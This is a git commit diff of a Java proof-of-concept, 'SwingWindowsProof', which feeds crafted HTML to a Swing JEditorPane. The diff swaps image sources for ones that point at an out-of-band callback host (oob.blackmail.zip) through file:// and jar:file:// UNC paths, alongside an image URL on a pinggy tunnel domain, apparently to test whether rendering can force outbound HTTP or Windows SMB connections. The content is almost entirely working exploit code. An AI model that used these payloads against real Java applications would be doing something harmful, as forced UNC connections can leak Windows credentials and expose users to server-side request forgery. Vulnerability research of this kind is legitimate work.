f920f2161f28cce7d34048457730ebbeeb55cdfc
sealldeveloper-aidr2 <umgdl71fvon28qmf--githubaidr2-1785896221@oob.blackmail.zip>
2026-08-17 04:41:33 +0000

    test jar file UNC image URL

--- SwingWindowsProof.java
+++ SwingWindowsProof.java
@@ -3,16 +3,12 @@ public class SwingWindowsProof {
  public static void main(String[] args) throws Exception {
    System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
    String html="<html><body>"+
-     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image'>"+
-     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;https://ddlnp-54-196-15-50.run.pinggy-free.link/nested-image&quot;&gt;&lt;/html&gt;'></object>"+
-     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;file://cwgmxyssmmssmczp--ijunc1786941240.oob.blackmail.zip/share/nonexistent&quot;&gt;&lt;/html&gt;'></object>"+
+     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image-jar-test'>"+
+     "<img src='jar:file://cwgmxyssmmssmczp--ijjarunc1786941692.oob.blackmail.zip/SHARE/nonexistent.jar!/x.png'>"+
      "</body></html>";
    SwingUtilities.invokeAndWait(() -> {
-     JEditorPane pane=new JEditorPane("text/html",html);
-     JFrame frame=new JFrame("proof"); frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE); frame.add(pane); frame.setSize(500,500); frame.setVisible(true);
-     System.out.println("Rendered frame: "+html);
+     JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html);
    });
-   Thread.sleep(30000);
-   System.out.println("done"); System.exit(0);
+   Thread.sleep(30000); System.out.println("done"); System.exit(0);
  }
 }
